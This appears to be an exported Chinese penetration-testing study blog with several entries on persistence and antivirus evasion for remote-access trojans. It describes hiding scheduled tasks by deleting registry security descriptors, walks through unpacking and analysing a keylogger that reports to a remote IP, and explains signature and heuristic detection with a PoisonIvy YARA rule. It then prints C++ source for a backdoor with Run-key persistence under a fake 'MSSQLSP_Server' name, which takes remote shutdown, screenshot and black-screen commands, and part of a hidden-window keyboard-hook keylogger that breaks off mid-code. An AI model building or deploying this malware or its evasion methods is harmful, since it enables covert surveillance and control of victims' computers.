aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><h2 id="RAT利用权限维持持久免杀（四）"><a href="#RAT利用权限维持持久免杀（四）" class="headerlink" title="RAT利用权限维持持久免杀（四）"></a>RAT利用权限维持持久免杀（四）</h2><h4 id="关于ScheduleRunner"><a href="#关于ScheduleRunner" class="headerlink" title="关于ScheduleRunner"></a>关于ScheduleRunner</h4><p>通过“计划任务”来实现渗透测试是过去十年中最流行的技术之一，而且该技术也是目前网络安全研究人员在实现持久化和横向移动时说普遍使用的。</p><p>在此之前，社区已经有很多相关的C#工具了，但这些工具多多少少都会有一些局限性。因此，ScheduleRunner便应运而生。ScheduleRunner同样也是一款基于C#开发的安全测试工具，该工具提供了高度定制化开发支持，灵活性也非常高，可以在渗透测试活动中帮助广大研究人员通过“计划任务”来实现持久化和横向移动任务。</p><p><img src="https://fynotefile.oss-cn-zhangjiakou.aliyuncs.com/fynote/fyfile/2446/1650933853044/e5d0315909354469baea3ed3436070a0.png" alt="image.png"></p><h2 id="隐藏计划任务"><a href="#隐藏计划任务" class="headerlink" title="隐藏计划任务"></a>隐藏计划任务</h2><p><img src="https://fynotefile.oss-cn-zhangjiakou.aliyuncs.com/fynote/fyfile/2446/1650933853044/74c09a748b324b1387a1ff220baadba8.png" alt="image.png"></p><p>这项技术是HAFNIUM团队一直在使用的，近期才被微软所发现。该技术的使用需要“NT AUTHORITY/SYSTEM”权限，接下来ScheduleRunner将会执行下列操作：</p><blockquote><p>1、从“HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Schedule\TaskCache\Tree[task name]”删除“SD”值；</p><p>2、删除计划任务XML文件“C:\Windows\System32\Tasks[task name]”；</p></blockquote><p>如果想要删除此技术创建的计划任务，则需要在delete方法中添加“/technique:hide”以正确删除任务。</p><h2 id="技术限制"><a href="#技术限制" class="headerlink" title="技术限制"></a>技术限制</h2><p>如果任务是通过注册表删除的话，那么该任务仍然会在下次系统重新启动时继续运行。因此，最好不要在服务器上使用这种技术来进行操作。</p><h2 id="工具运行截图"><a href="#工具运行截图" class="headerlink" title="工具运行截图"></a>工具运行截图</h2><p><img src="https://image.3001.net/images/20220416/1650108022_625aa67659b75786277d1.png!small"></p>]]></content>
      
      
      
    </entry>
    
    
    
    <entry>
      <title></title>
      <link href="/2023/07/16/penetration-test-learning/part-2-infiltration-and-defense/40-mian-sha/bi-ji-1.7-fu-he-xin-fan-bing-du-gong-cheng-shi-dui-jian-pan-ji-lu-cha-jian-fen-xi-si-wei/"/>
      <url>/2023/07/16/penetration-test-learning/part-2-infiltration-and-defense/40-mian-sha/bi-ji-1.7-fu-he-xin-fan-bing-du-gong-cheng-shi-dui-jian-pan-ji-lu-cha-jian-fen-xi-si-wei/</url>
      
        <content type="html"><![CDATA[<p>逆向分析</p><p>第一步：</p><p>查壳：</p><p>工具有PEID，EXEINFOPE 等多个 推荐使用Exeinfo PE ，最近更新2019.9.27；当然查壳软件需要多个，防止误查。</p><p><img src="file:///C:\Users\ww\AppData\Local\Temp\ksohtml\wpsCB3E.tmp.jpg"><img src="https://fynotefile.oss-cn-zhangjiakou.aliyuncs.com/fynote/fyfile/2446/1650853882019/6ad2015ece04429f991ba243d5b99e71.png" alt="image.png"></p><p><img src="file:///C:\Users\ww\AppData\Local\Temp\ksohtml\wpsCB4E.tmp.jpg"><img src="https://fynotefile.oss-cn-zhangjiakou.aliyuncs.com/fynote/fyfile/2446/1650853882019/79ecbd2a69a64acc98653aa37bdf6fa1.png" alt="image.png"></p><p>可以看到是一个UPX的壳</p><p>第二步：</p><pre class="line-numbers language-none"><code class="language-none">脱壳：<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>直接用脱壳工具脱壳，注意脱壳软件适用的版本</p><p>也可以手动脱壳，下面演示一下手动脱壳</p><p>使用OD 载入目标文件，会出现下列提示</p><p><img src="file:///C:\Users\ww\AppData\Local\Temp\ksohtml\wpsCB4F.tmp.jpg"><img src="https://fynotefile.oss-cn-zhangjiakou.aliyuncs.com/fynote/fyfile/2446/1650853882019/159e9f604fc94710b39cf8e0d1241dba.png" alt="image.png"></p><p>点击 是</p><p>来到壳的入口</p><p><img src="file:///C:\Users\ww\AppData\Local\Temp\ksohtml\wpsCB60.tmp.jpg"><img src="https://fynotefile.oss-cn-zhangjiakou.aliyuncs.com/fynote/fyfile/2446/1650853882019/591be93e7899487fb27ead43619c979e.png" alt="image.png"></p><p>下面我们使用ESP定律来脱壳</p><p>简单说下ESP定律：</p><p>ESP定律的原理是：堆栈平衡原理</p><p>ESP定律使用的范围：几乎全部的压缩壳，部分加密壳</p><p>注意此时寄存器窗口（FPU）的显示，单步F8，当FPU窗口中有且只有ESP和EIP变为红色的时候，右键点击FPU窗口中的ESP ，然后点击 “数据窗口跟随”。</p><p>或者下方command窗口中输入DD ESP的值，如此次分析就是DD 0012FF6C，敲击回车键</p><p><img src="file:///C:\Users\ww\AppData\Local\Temp\ksohtml\wpsCB71.tmp.jpg"><img src="https://fynotefile.oss-cn-zhangjiakou.aliyuncs.com/fynote/fyfile/2446/1650853882019/1572a77e43764c84848e1088245eab32.png" alt="image.png"></p><p>这两种方法都是来到数据窗口中的0012FF6C 地址</p><p><img src="file:///C:\Users\ww\AppData\Local\Temp\ksohtml\wpsCB72.tmp.jpg"><img src="https://fynotefile.oss-cn-zhangjiakou.aliyuncs.com/fynote/fyfile/2446/1650853882019/4b2287909c23463a9ca15d6b095651f3.png" alt="image.png"></p><p>在数据窗口中0012FF6C 的数值栏中右键下硬件访问断点</p><p><img src="file:///C:\Users\ww\AppData\Local\Temp\ksohtml\wpsCB73.tmp.jpg"><img src="https://fynotefile.oss-cn-zhangjiakou.aliyuncs.com/fynote/fyfile/2446/1650853882019/aeaac375e8714205bfcaa69962981de2.png" alt="image.png"></p><p>这个操作也可以在command窗口输入 HR 0012FFA4 回车后完成，然后我们按F9运行程序，此时程序会暂停在我们设置的断点位置</p><p><img src="file:///C:\Users\ww\AppData\Local\Temp\ksohtml\wpsCB74.tmp.jpg"><img src="https://fynotefile.oss-cn-zhangjiakou.aliyuncs.com/fynote/fyfile/2446/1650853882019/2e2c91f259614cb9aa982f21ac5b7299.png" alt="image.png"></p><p>这个时候我们可以看到程序下面有一个非常显眼的大跳转，jmp wechat.004028A2就是我们需要的程序OEP</p><p>这时候在 jmp wechar.004028A2 上右键，选择此处为新的EIP ，然后，F8 单步过，来到程序的领空</p><p><img src="file:///C:\Users\ww\AppData\Local\Temp\ksohtml\wpsCB84.tmp.jpg"><img src="https://fynotefile.oss-cn-zhangjiakou.aliyuncs.com/fynote/fyfile/2446/1650853882019/f92829b44b874b4aad67e3362e16e6e7.png" alt="image.png"></p><p><img src="file:///C:\Users\ww\AppData\Local\Temp\ksohtml\wpsCB85.tmp.jpg"><img src="https://fynotefile.oss-cn-zhangjiakou.aliyuncs.com/fynote/fyfile/2446/1650853882019/c4fec82c03ad4757ab242e460ac0eada.png" alt="image.png"></p><p>然后我们就可以脱壳了，脱壳前先把断点去掉调试-硬件断点-删除</p><p><img src="file:///C:\Users\ww\AppData\Local\Temp\ksohtml\wpsCB86.tmp.jpg"><img src="https://fynotefile.oss-cn-zhangjiakou.aliyuncs.com/fynote/fyfile/2446/1650853882019/8d920526286a4857901f2bc8abaa9ddb.png" alt="image.png"></p><p>然后右击程序当前位置第一行代码，选择OllyDump脱壳调试进程</p><p><img src="file:///C:\Users\ww\AppData\Local\Temp\ksohtml\wpsCB87.tmp.jpg"><img src="https://fynotefile.oss-cn-zhangjiakou.aliyuncs.com/fynote/fyfile/2446/1650853882019/c777a64488ea4badacfb8a5d9856109a.png" alt="image.png"></p><p>在弹出的窗口中点击脱壳</p><p><img src="file:///C:\Users\ww\AppData\Local\Temp\ksohtml\wpsCB98.tmp.jpg"><img src="https://fynotefile.oss-cn-zhangjiakou.aliyuncs.com/fynote/fyfile/2446/1650853882019/0e7c28741bb24e41ac309e99530daf05.png" alt="image.png"></p><p>保存文件</p><p><img src="file:///C:\Users\ww\AppData\Local\Temp\ksohtml\wpsCB99.tmp.jpg"><img src="https://fynotefile.oss-cn-zhangjiakou.aliyuncs.com/fynote/fyfile/2446/1650853882019/4f98b5eabb7a4ec9ab022d197d3f5b23.png" alt="image.png"></p><p>此时我们已经完成了脱壳</p><p>使用查壳软件查看</p><p>这个目标的壳只是简单的UPX壳，也没有资源修复之类的，如果遇见需要修复重定位和资源的话，可以参考其他教程</p><p>、<img src="https://fynotefile.oss-cn-zhangjiakou.aliyuncs.com/fynote/fyfile/2446/1650853882019/0856e219c9af4733b233b4e25bc67c46.png" alt="image.png"></p><p>第三步：</p><pre class="line-numbers language-none"><code class="language-none">分析：将dump出来的程序拖进OD里面，这次打开没有加密提示了。<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre><p><img src="file:///C:\Users\ww\AppData\Local\Temp\ksohtml\wpsCB9B.tmp.jpg"><img src="https://fynotefile.oss-cn-zhangjiakou.aliyuncs.com/fynote/fyfile/2446/1650853882019/645e7123f70b44c88aa6f81caffcc4ef.png" alt="image.png"></p><p>我们可以使用一些插件来帮助我们完成一系列的工作。</p><p>比如使用中文搜索插件</p><p><img src="file:///C:\Users\ww\AppData\Local\Temp\ksohtml\wpsCBAB.tmp.jpg"><img src="https://fynotefile.oss-cn-zhangjiakou.aliyuncs.com/fynote/fyfile/2446/1650853882019/2debbcf4bd1642f59119c9ba58f3c53c.png" alt="image.png"></p><p>点击只能搜索，我们先来看看有没有非常显眼的字符串，如果是加壳程序，插件分析是不起作用的，所以，只有脱过壳的程序才能使用。</p><p><img src="file:///C:\Users\ww\AppData\Local\Temp\ksohtml\wpsCBAC.tmp.jpg"><img src="https://fynotefile.oss-cn-zhangjiakou.aliyuncs.com/fynote/fyfile/2446/1650853882019/e34ead66c7364462be85677768b0e930.png" alt="image.png"></p><p>非常的幸运，我们第一眼就看到了关键的字符串，图中的110.110.110.110 像是木马回链的IP地址，C：\windwos\Temp\kbhook.dat 路径从名字来看是一个hook相关的文件，还有相关的汉字“你好”。我们就先从“你好”分析，鼠标双击 你好， 进入程序主界面</p><p><img src="file:///C:\Users\ww\AppData\Local\Temp\ksohtml\wpsCBAD.tmp.jpg"><img src="https://fynotefile.oss-cn-zhangjiakou.aliyuncs.com/fynote/fyfile/2446/1650853882019/f35675006eeb4bf4887e787ba8ac46ab.png" alt="image.png"></p><p>可以看到，这是向110.110.110.100服务器发送“你好”字符。</p><p>我们再来看看这个 kbhook.dat 是什么东西，打开路径</p><p><img src="file:///C:\Users\ww\AppData\Local\Temp\ksohtml\wpsCBBE.tmp.jpg"><img src="https://fynotefile.oss-cn-zhangjiakou.aliyuncs.com/fynote/fyfile/2446/1650853882019/1b500f84ca4848c998756a46efc7944b.png" alt="image.png"></p><p>发现是0KB ，里面一片空白，这时候我们需要关闭OD ，让程序真正的执行一下。</p><p>调用任务管理器查看一下程序的进程</p><p><img src="file:///C:\Users\ww\AppData\Local\Temp\ksohtml\wpsCBBF.tmp.jpg"><img src="https://fynotefile.oss-cn-zhangjiakou.aliyuncs.com/fynote/fyfile/2446/1650853882019/7c828bb0df77477ebb86e58c1653150e.png" alt="image.png"></p><p>这时候发现kbhook.dat已经变大了 ，猜测是键盘记录我们打开kbhook，发现被目标占用，先结束进程，再打开文件</p><p><img src="file:///C:\Users\ww\AppData\Local\Temp\ksohtml\wpsCBD0.tmp.jpg"><img src="https://fynotefile.oss-cn-zhangjiakou.aliyuncs.com/fynote/fyfile/2446/1650853882019/ddb11bbdcf544f4d936fad34c743989d.png" alt="image.png"></p><p>经对照，是经过base64编码的解码后是记录的键盘操作，分析完成。</p><p>我们也可以使用IDA进行分析，首先将目标程序拖进OD ，并F8单步过，一直到程序运行起来，记录下程序在哪一个CALL 上面直接运行起来的。</p><p>经过单步，我们发现程序是在 call wechat1.00402220这个地址上直接运行起来的。我们记录下这个地址，打开IDA，将目标拖入IDA</p><p><img src="file:///C:\Users\ww\AppData\Local\Temp\ksohtml\wpsCBD1.tmp.jpg"></p><p>点击确定加载程序，因为没有重定位，所以地址一样，如果是有重定位，需要勾选IDA“手动加载”，然后将OD中的中的基地址（按alt+E调出OD窗口）填进去，这样两个程序的地址就能对应起来</p><p><img src="file:///C:\Users\ww\AppData\Local\Temp\ksohtml\wpsCBD2.tmp.jpg"></p><p><img src="file:///C:\Users\ww\AppData\Local\Temp\ksohtml\wpsCBD3.tmp.jpg"></p><p><img src="file:///C:\Users\ww\AppData\Local\Temp\ksohtml\wpsCBE3.tmp.jpg"></p><p>我们进入IDA的概览模式，敲击空格键切换到反汇编</p><p><img src="file:///C:\Users\ww\AppData\Local\Temp\ksohtml\wpsCBE4.tmp.jpg"></p><p>我们来搜索一下记录的地址，快捷键G 是地址搜索</p><p><img src="file:///C:\Users\ww\AppData\Local\Temp\ksohtml\wpsCBE5.tmp.jpg"></p><p>点击确定</p><p><img src="file:///C:\Users\ww\AppData\Local\Temp\ksohtml\wpsCBE6.tmp.jpg"></p><p>来到了函数00402220 ，这时候我们使用F5插件进行代码的伪C查看</p><p><img src="file:///C:\Users\ww\AppData\Local\Temp\ksohtml\wpsCBF7.tmp.jpg"></p><p>可以看到，程序的流程一目了然。</p>]]></content>
      
      
      
    </entry>
    
    
    
    <entry>
      <title></title>
      <link href="/2023/07/16/penetration-test-learning/part-2-infiltration-and-defense/40-mian-sha/bi-ji-1.7-cong-yuan-ma-jie-jue-rat-mian-sha-wen-ti-shang/"/>
      <url>/2023/07/16/penetration-test-learning/part-2-infiltration-and-defense/40-mian-sha/bi-ji-1.7-cong-yuan-ma-jie-jue-rat-mian-sha-wen-ti-shang/</url>
      
        <content type="html"><![CDATA[<h2 id="红队RAT源码免杀思维（一）"><a href="#红队RAT源码免杀思维（一）" class="headerlink" title="红队RAT源码免杀思维（一）"></a>红队RAT源码免杀思维（一）</h2><p>世面上很多的杀软免杀技术，但经过一些实战，发现一个问题，会有很多方法推荐给你，例如</p><ul><li>加壳</li><li>加花指令</li></ul><p>等等的方式。本来不会被查杀的程序，被加壳后还被查杀了。这对刚学免杀容易造成情绪化放弃。那么有没有一种实战性性强（既免杀率高，免杀效果持久），</p><p>在该技术中将<strong>静态免杀</strong>和 <strong>动态免杀</strong> ，划分方式为 <strong>是否运行程序</strong> 。主要分为以下两种情况:</p><p>1.如果<strong>放置进杀软环境</strong>被查杀则<strong>可能</strong>为<strong>静态查杀</strong>或 <strong>动态查杀</strong> (沙箱查杀DLL，因为DLL并不会直接运行)。</p><p>2.如果<strong>双击</strong>运行被查杀，则为 <strong>动态查杀</strong> 。</p><h5 id="静态查杀"><a href="#静态查杀" class="headerlink" title="静态查杀"></a>静态查杀</h5><p>静态查杀可以分为两种查杀，一种为查杀 <strong>已知类型查杀</strong> ，一种为查杀 <strong>未知类型查杀</strong> 。其中通过指定文件hash，或文件中存在多个字符串则可以通过指定存在这些特征的则为这一类病毒，以下分别介绍。</p><h5 id="已知病毒查杀-特征码查杀"><a href="#已知病毒查杀-特征码查杀" class="headerlink" title="已知病毒查杀-特征码查杀"></a>已知病毒查杀-特征码查杀</h5><p><strong>特征码是表示，知乎按照指定模式进行特征匹配的算法，而具体使用什么类型的规则（既各种扫描算法）取决于扫描器</strong> ，下面我们来介绍一种模式匹配规则，YARA规则。YARA是一款旨在帮助恶意软件研究人员识别和分类恶意软件样本的开源工具，使用YARA可以基于文本或二进制模式创建恶意软件家族描述信息，当然也可以是其他匹配信息。接下来我们来分析一个出名通用远控PoisonIvy的yara规则。</p><pre class="line-numbers language-none"><code class="language-none">rule PoisonIvy_Generic_3 {    meta:        description = "PoisonIvy RAT Generic Rule"        license = "https://creativecommons.org/licenses/by-nc/4.0/"        author = "Florian Roth"        date = "2022-04-07"        hash = "e1cbdf740785f97c93a0a7a01ef2614be792afcd"    strings:        $k1 = "Tiger324{" fullword ascii        $s2 = "WININET.dll" fullword ascii        $s3 = "mscoree.dll" fullword wide        $s4 = "WS2_32.dll" fullword        $s5 = "Explorer.exe" fullword wide        $s6 = "USER32.DLL"        $s7 = "CONOUT$"        $s8 = "login.asp"        $h1 = "HTTP/1.0"        $h2 = "POST"        $h3 = "login.asp"        $h4 = "check.asp"        $h5 = "result.asp"        $h6 = "upload.asp"    condition:        uint16(0) == 0x5a4d and filesize &lt; 500KB and            (                 $k1 or all of ($s*) or all of ($h*)            )}<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>上述规则说，满足k1或s规则或h规则且大小小于500kb为pe文件的则为poisonlvy病毒。可以从规则上来看，大小，字符串，使用的DLL等等软件构成部分都可以成为检测病毒的一部分。总结一下即 <strong>程序符合特定规则则认定这个程序为指定病毒</strong> 。</p><h2 id="红队RAT源码免杀思维（二）"><a href="#红队RAT源码免杀思维（二）" class="headerlink" title="红队RAT源码免杀思维（二）"></a>红队RAT源码免杀思维（二）</h2><h4 id="未知病毒查杀-静态启发式查杀"><a href="#未知病毒查杀-静态启发式查杀" class="headerlink" title="未知病毒查杀-静态启发式查杀"></a>未知病毒查杀-静态启发式查杀</h4><p><strong>启发式查杀是对单一特征码查杀的补充，解决未知病毒查杀</strong> 。早期杀软都是发现病毒，制作该病毒的特征码，但是对于未知病毒就无法查杀，而启发式则是将一类病毒总结后，归纳其特征，其后的演变都为一类病毒，这既是启发式算法。具体启发式算法可以由杀软来定，比如可以使用机器学习把家族病毒聚类，或简单的通过使用通用型yara规则，例如文件大小小于100kb，且没有图标则可以识别为病毒，以此达到查杀壳病毒。例如，有的杀软会查杀main函数中仅仅有几行无效代码。这也是我们经常遇到的 <strong>误报</strong> 。</p><h4 id="动态查杀"><a href="#动态查杀" class="headerlink" title="动态查杀"></a>动态查杀</h4><p>动态查杀同样分为两种查杀，一种为指定类型查杀，一种为未知类型查杀。</p><h4 id="已知病毒查杀查杀-内存特征"><a href="#已知病毒查杀查杀-内存特征" class="headerlink" title="已知病毒查杀查杀-内存特征"></a>已知病毒查杀查杀-内存特征</h4><p>例如，某数字查杀cobaltstrike等知名远控则是通过shell code内存匹配来进行查杀。</p><h4 id="未知病毒查杀-启发式查杀和主动防御"><a href="#未知病毒查杀-启发式查杀和主动防御" class="headerlink" title="未知病毒查杀-启发式查杀和主动防御"></a>未知病毒查杀-启发式查杀和主动防御</h4><p>杀软通过拦截程序运行的api调用，通过api序列，或其是否高危来判定是否为病毒。</p><p>举几个例子，</p><p>1.Kas针对cobaltstrike的查杀是通过联网URL的地址特征，进行查杀。</p><p>2.通过将Dll拷贝到磁盘后，会被沙箱进行行为分析。例如，Dll下载者会被查杀，很明显DLL是没办法直接双击运行，但某些杀软依旧会查杀。</p><p>3.注入explorer.exe直接被干掉。</p><p>4.Bitdexxxxx会在运行时查杀空壳且名字随机的1.exe,asd.exe，干扰免杀。</p><p><strong>注意：主动防御有的杀软会在断网模式不开启该功能。</strong></p><p><img src="https://fynotefile.oss-cn-zhangjiakou.aliyuncs.com/fynote/fyfile/2446/1650765078005/3be4c6d9100944f4a7b673c8490b6f36.png" alt="image.png"></p><p><img src="https://fynotefile.oss-cn-zhangjiakou.aliyuncs.com/fynote/fyfile/2446/1650765078005/84b4121508d5437da24c1275d69172b0.png" alt="image.png"></p><h2 id="红队RAT源码免杀实战（三）"><a href="#红队RAT源码免杀实战（三）" class="headerlink" title="红队RAT源码免杀实战（三）"></a>红队RAT源码免杀实战（三）</h2><p><img src="https://fynotefile.oss-cn-zhangjiakou.aliyuncs.com/fynote/fyfile/2446/1650765078005/e52045925117419e81537cc3f61181b0.png" alt="image.png"></p><pre class="line-numbers language-none"><code class="language-none">#include &lt;stdio.h&gt;#include &lt;iostream&gt;#include &lt;winsock2.h&gt;#include &lt;string&gt;#include &lt;windows.h&gt;#include &lt;winuser.h&gt;#pragma comment(lib,"ws2_32.lib")using namespace std;#define RUN_KEY_ADMIN "SOFTWARE\\Wow6432Node\\Microsoft\\Windows\\CurrentVersion\\Run"#define RUN_KEY "SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Run"int addRunEntry(char *name, char *path){    HKEY key;    int len = strlen(path) + 1;    //LONG r = RegOpenKeyEx(HKEY_LOCAL_MACHINE, RUN_KEY, 0, KEY_ALL_ACCESS, &amp;key);LONG r = RegOpenKeyEx(HKEY_CURRENT_USER, RUN_KEY, 0, KEY_ALL_ACCESS, &amp;key);    if (r != ERROR_SUCCESS) {        // unable to open key for adding values.        return 1;    }     r = RegSetValueEx(key, name, 0, REG_SZ, (BYTE *)path, len);    if (r != ERROR_SUCCESS) {        RegCloseKey(key);        // unable to change registry value.        return 1;    }       RegCloseKey(key);     // success    return 0; }void loader(char szExe[], char szArgs[]){    STARTUPINFO          si = { sizeof(si) };    PROCESS_INFORMATION  pi;    if(CreateProcessA(szExe, szArgs, 0, 0, FALSE, 0, 0, 0, LPSTARTUPINFOA(&amp;si), &amp;pi))    {        // optionally wait for process to finish        //WaitForSingleObject(pi.hProcess, INFINITE);        CloseHandle(pi.hProcess);        CloseHandle(pi.hThread);    }}int WINAPI WinMain(HINSTANCE inst,HINSTANCE prev,LPSTR cmd,int show){//registry autorunchar result[260];string( result, GetModuleFileName(NULL, result, 260));string try1 = (string)result;string try2 = "\""+try1+"\"";char *result2 = (char*)try2.c_str();addRunEntry("MSSQLSP_Server", result2);bool running = true;while(running){WSADATA WsaDat;if(WSAStartup(MAKEWORD(2,2),&amp;WsaDat)!=0){std::cout&lt;&lt;"WSA Initialization failed!\r\n";WSACleanup();system("PAUSE");return 0;}SOCKET Socket=socket(AF_INET,SOCK_STREAM,IPPROTO_TCP);if(Socket==INVALID_SOCKET){std::cout&lt;&lt;"Socket creation failed.\r\n";WSACleanup();system("PAUSE");return 0;}SOCKADDR_IN serverInf;serverInf.sin_family=AF_INET;serverInf.sin_addr.s_addr=INADDR_ANY;serverInf.sin_port=htons(25565);if(bind(Socket,(SOCKADDR*)(&amp;serverInf),sizeof(serverInf))==SOCKET_ERROR){std::cout&lt;&lt;"Unable to bind socket!\r\n";WSACleanup();system("PAUSE");return 0;}listen(Socket,1);SOCKET TempSock=SOCKET_ERROR;while(TempSock==SOCKET_ERROR){std::cout&lt;&lt;"Waiting for incoming connections...\r\n";TempSock=accept(Socket,NULL,NULL);}Socket=TempSock;std::cout&lt;&lt;"Client connected!\r\n\r\n";char *szMessage="Welcome to the server! Use SCREENSHOT or SHUTDOWN or BLACKSCREEN\r\n";send(Socket,szMessage,strlen(szMessage),0);//char buffer[1024] = {'\0'};std::string message;int s = recv(Socket, buffer, 1024, 0);/*cout &lt;&lt; "outgoing MESSAGE: ";cin &gt;&gt; message;send(Socket, message.c_str(), message.length(), 0);*/message = (string)buffer;cout &lt;&lt; message;if (std::string::npos != message.find("SCREENSHOT")){char* appdata = getenv("APPDATA");string asdf = (string)appdata + "\\Server_actions.exe";char * ddd = &amp;asdf[0];loader(ddd, " SCREENSHOT");string backstr = "it's up to you, master.. Screenes may be cool!";send(Socket, backstr.c_str(), backstr.length(), 0);}else if(std::string::npos != message.find("SHUTDOWN")){//shutdown the pc//restart appchar* appdata = getenv("APPDATA");string asdf = (string)appdata + "\\Server_actions.exe";char * ddd = &amp;asdf[0];loader(ddd, " SHUTDOWN");string backstr = "Shutting down..";send(Socket, backstr.c_str(), backstr.length(), 0);return 0;}else if(std::string::npos != message.find("BLACKSCREEN")){//black screen//restart appchar* appdata = getenv("APPDATA");string asdf = (string)appdata + "\\Server_actions.exe";char * ddd = &amp;asdf[0];loader(ddd, " BLACKSCREEN");string backstr = "it's up to you, master.. Having fun on a black desktop :)";send(Socket, backstr.c_str(), backstr.length(), 0);}// Shutdown our socketshutdown(Socket,SD_SEND);// Close our socket entirelyclosesocket(Socket);// Cleanup WinsockWSACleanup();}system("PAUSE");return 0;}<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h2 id="红队RAT源码免杀实战（四）"><a href="#红队RAT源码免杀实战（四）" class="headerlink" title="红队RAT源码免杀实战（四）"></a>红队RAT源码免杀实战（四）</h2><p><img src="https://fynotefile.oss-cn-zhangjiakou.aliyuncs.com/fynote/fyfile/2446/1650765078005/66d609643ca4494e81ee1c747b0477f0.png" alt="image.png"></p><p><img src="https://fynotefile.oss-cn-zhangjiakou.aliyuncs.com/fynote/fyfile/2446/1650765078005/523ade1c8c904f0a8e4c5f8acd15515e.png" alt="image.png"></p><pre class="line-numbers language-none"><code class="language-none">// KbHook.cpp : Defines the entry point for the console application.//#include "pch.h"#include "windows.h"#include "stdio.h"#include "kbhook.h"#include &lt;malloc.h&gt;#define _WIN32_WINNT  0x0500    //仅NT5.0以上系统可用#define WM_StartHook WM_USER+100#define WM_StopHook  WM_USER+200#define WM_MYQUIT  WM_USER+300typedef LRESULT(WINAPI *My_DefWindowProc)(HWND hWnd, UINT Msg, WPARAM wParam, LPARAM lParam);My_DefWindowProc myDefWindowProc;typedef HHOOK(WINAPI *My_SetWindowsHookEx)(int idHook, HOOKPROC lpfn, HINSTANCE hMod, DWORD dwThreadId);My_SetWindowsHookEx mySetWindowsHookEx;//---------------------------------------------------------------------------------_KbHook* _KbHook::m_pThis = NULL;_KbHook::_KbHook(){m_pThis = this;m_hWndKeylogger = NULL;m_hhook = NULL;m_hLastFocus = NULL;m_bSend = false;m_bOfflineLog = false;m_bLogToFile = false;memset(m_CurrentWindowText, 0, sizeof(m_CurrentWindowText));memset(m_LastWindowText, 0, sizeof(m_LastWindowText));memset(m_fileName, 0, MAX_PATH);m_hFile = INVALID_HANDLE_VALUE;m_hCreateWindowEvent = CreateEvent(NULL, false, false, NULL);m_ThreadHandle = CreateThread(NULL, NULL, CreateWindowThread, this, NULL, &amp;m_ThreadID);WaitForSingleObject(m_hCreateWindowEvent, 10000);//10秒应该够长了吧}//---------------------------------------------------------------------------------_KbHook::~_KbHook(){SendMessage(m_hWndKeylogger, WM_QUIT, 0, 0);if (m_ThreadHandle != NULL){try{TerminateThread(m_ThreadHandle, 0);m_ThreadHandle = NULL;}catch (...){return;}}}//创建窗口DWORD __stdcall _KbHook::CreateWindowThread(LPVOID lpParam){_KbHook* pKbHook = (_KbHook*)lpParam;pKbHook-&gt;CreateWindowHook();return 0;}void _KbHook::CreateWindowHook(){try{Desktop_Capture("WinSta0", NULL, NULL, 0);WNDCLASSEXwndClassEx;//ebp-6c//charszBuffer[0x20];//ebp-3cMSGmsg;//ebp-1cHMODULE hModule = GetModuleHandle(NULL);//句柄，相当于 HINSTANCEif (hModule != 0){//创建窗口 设定视窗类别wndClassEx.cbSize = 0x30;wndClassEx.style = 0;wndClassEx.lpfnWndProc = HookWindowProc;wndClassEx.cbClsExtra = 0;wndClassEx.cbWndExtra = 0;wndClassEx.hInstance = hModule;wndClassEx.hIcon = 0;wndClassEx.hCursor = NULL;wndClassEx.hbrBackground = NULL;wndClassEx.lpszMenuName = NULL;wndClassEx.lpszClassName = "KB";wndClassEx.hIconSm = 0;// 注册新视窗类别RegisterClassEx(&amp;wndClassEx);// 建构视窗m_hWndKeylogger = CreateWindowEx(0, wndClassEx.lpszClassName, NULL, WS_OVERLAPPED,0, 0, 0, 0, NULL, NULL, hModule, NULL);ShowWindow(m_hWndKeylogger, SW_HIDE);UpdateWindow(m_hWndKeylogger);SetEvent(m_hCreateWindowEvent);// 等待 WM_QUIT 消息循环try{while (GetMessage(&amp;msg, NULL, 0, 0)){TranslateMessage(&amp;msg);DispatchMessage(&amp;msg);}}catch (...){}if (m_hhook != NULL){UnhookWindowsHookEx(m_hhook);m_hhook = NULL;}}}catch (...){}}LRESULT CALLBACK _KbHook::HookWindowProc(HWND hWndKeylogger, UINT Msg, WPARAM wParam, LPARAM lParam){HINSTANCE h = LoadLibrary("User32.dll");myDefWindowProc = (My_DefWindowProc)GetProcAddress(h, "DefWindowProcA");switch (Msg){case WM_StartHook:m_pThis-&gt;StartHook();return 0;case WM_StopHook:m_pThis-&gt;StopHook();return 0;case WM_QUIT:PostQuitMessage(0);return 0;default: break;}return myDefWindowProc(hWndKeylogger, Msg, wParam, lParam);}void _KbHook::SendStartHook(char* fileName, int len){if (m_hWndKeylogger == NULL)return;if (m_hhook)return;memcpy(m_fileName, fileName, len);SendMessage(m_hWndKeylogger, WM_StartHook, 0, 0);}//---------------------------------------------------------------------------------void 